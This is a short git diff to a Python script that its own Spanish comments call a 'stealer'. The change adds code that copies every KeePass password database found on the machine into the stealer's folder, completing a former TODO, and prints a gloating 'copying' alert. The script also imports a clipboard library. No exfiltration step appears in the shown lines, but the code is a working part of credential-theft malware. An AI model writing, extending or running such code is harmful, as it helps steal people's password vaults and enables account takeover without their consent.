@@ -11,6 +11,7 @@ import settings
 import pyperclip3 as pc
 import re
 import glob
+import shutil
 
 #1 => Registrar hallazgos en el Log
 def loguear_hallazgo(hallazgo, tipo):
@@ -93,7 +94,8 @@ bases_keepass = glob.glob(settings.patron_keepass, recursive=True)
 #2 => Registrar cada base de datos en el log
 for base in bases_keepass:
     loguear_hallazgo(base, "Base Keepass")
-#3 => Si se han encontrado bases de datos, avisar
+    #3 => Copiar las bases de datos a la carpeta del stealer
+    shutil.copy2(base, "./")
+#4 => Si se han encontrado bases de datos, avisar
 if len(bases_keepass) > 0:
     print("🚨 Encontrada Base de datos Keepass. Copiando... 😈")
-#TODO: Copiar la base de datos al directorio del Stealer
